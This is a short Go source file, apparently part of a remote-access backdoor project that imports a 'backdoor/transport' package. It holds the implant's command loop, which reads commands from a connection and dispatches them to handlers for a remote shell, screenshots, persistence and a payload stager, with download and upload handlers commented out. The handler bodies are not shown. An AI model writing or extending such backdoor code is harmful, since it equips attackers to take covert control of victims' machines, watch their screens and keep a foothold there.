package handler

import (
	"backdoor/transport"
	"strings"
)

type CommandHandler func(t transport.Transport, args []string)

var Registry = map[string]CommandHandler{
	"shell":       ShellHandler,
	"screen":      ScreenshotHandler,
	"persistence": PersistenceHandler,
	"stager":      StagerHandler,
	// "download": DownloadHandler,
	// "upload":   UploadHandler,
}

func Handle(t transport.Transport) {
	for {
		input, err := t.Read()
		if err != nil {
			return
		}
		parts := strings.Fields(string(input))
		if len(parts) == 0 {
			continue
		}
		command := parts[0]
		args := parts[1:]

		if handler, ok := Registry[command]; ok {
			handler(t, args)
		} else {
			t.Write([]byte("Comando no reconocido\n"))
		}
	}
}
